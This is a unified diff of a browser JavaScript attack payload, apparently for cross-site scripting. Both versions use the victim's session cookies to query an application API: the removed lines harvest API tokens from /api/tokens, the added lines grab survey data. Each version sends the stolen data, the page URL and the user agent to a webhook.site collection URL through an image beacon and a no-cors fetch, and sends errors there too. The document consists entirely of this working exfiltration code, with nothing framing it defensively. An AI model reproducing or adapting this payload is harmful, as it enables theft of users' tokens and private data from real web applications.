@@ -1,44 +1,28 @@
-fetch("/api/tokens?limit=100", {
+fetch("/api/surveys/installations/697e3220babd563bdc5cb817/surveys/active", {
   method: "GET",
   credentials: "include"
 })
 .then(r => r.json())
 .then(data => {
-  console.log("[+] API response received:", data);
+  console.log("[+] API data received:", data);
 
-  // Check if the response is an object with an `entries` array (based on your screenshot)
-  const entries = Array.isArray(data.entries) ? data.entries : [];
-  console.log("[+] Token entries count:", entries.length);
+  const payload = {
+    data,
+    url: location.href,
+    ua: navigator.userAgent
+  };
 
-  if (entries.length > 0) {
-    // Extract all tokens
-    const tokens = entries.map(e => e.token).filter(Boolean);
-    console.log("[+] Extracted tokens:", tokens);
+  const exfilUrl = "https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371?data=" + encodeURIComponent(JSON.stringify(payload));
 
-    if (tokens.length > 0) {
-      const fullPayload = {
-        tokens,
-        location: location.href,
-        ua: navigator.userAgent
-      };
+  console.log("[+] Exfiltrating to:", exfilUrl);
 
-      const url = "https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371?data=" +
-                  encodeURIComponent(JSON.stringify(fullPayload));
+  // Use both image and fetch
+  const img = new Image();
+  img.src = exfilUrl;
 
-      console.log("[+] Sending token to webhook:", url);
-
-      // Use both image beacon and fetch
-      new Image().src = url;
-      fetch(url, { mode: "no-cors" });
-    } else {
-      console.warn("[!] No tokens found in entries.");
-    }
-  } else {
-    console.warn("[!] No entries array or empty.");
-  }
+  fetch(exfilUrl, { mode: "no-cors" });
 })
-.catch(e => {
-  console.error("[!] Error occurred:", e.message);
-  const err = encodeURIComponent(e.message);
-  new Image().src = `https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371?error=${err}`;
+.catch(err => {
+  const errorUrl = "https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371?error=" + encodeURIComponent(err.message);
+  new Image().src = errorUrl;
 });
